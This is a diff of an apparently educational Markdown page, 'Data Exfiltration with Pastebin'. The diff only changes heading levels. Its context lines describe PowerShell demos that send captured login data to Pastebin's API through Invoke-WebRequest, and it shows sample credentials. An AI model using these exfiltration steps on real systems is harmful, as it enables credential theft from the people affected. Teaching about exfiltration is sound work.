@@ -3,7 +3,7 @@ layout: default
 title: Data Exfiltration with Pastebin
 nav_order: 6
 ---
-## First demo
+# First demo
 
 Go to the folder where you previously created logindata.ps1 and create a new file called `new-pastebin.ps1` with the code below. Open your terminal and run new-pastebin.ps1 (don't doubleclick in windows, run it via the Powershell terminal)
 
@@ -76,7 +76,7 @@ my password for example.com is Kameham3ha!
 my username for example.com is ThebrokeShadower
 https://www.example.com/login-or-something
 ```
-## Demo 2
+# Demo 2
 Create a new file called "new-pastebin2.ps1" and copy paste the following data in it:
 ```
 
@@ -99,7 +99,7 @@ Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing 
 Execute new-pastebin2.ps1 from the terminal. If all goes well, you will have this pastebin under your personal account on the pastebin.com website.
 But there seems to be a problem?
 
-### Demo 3
+# Demo 3
 
 Powershell stores the data in an object. Which is not bad but invoke-webrequest doesn’t understand it and thus the parsing is bad.
 Let’s convert the data to a format which will work.
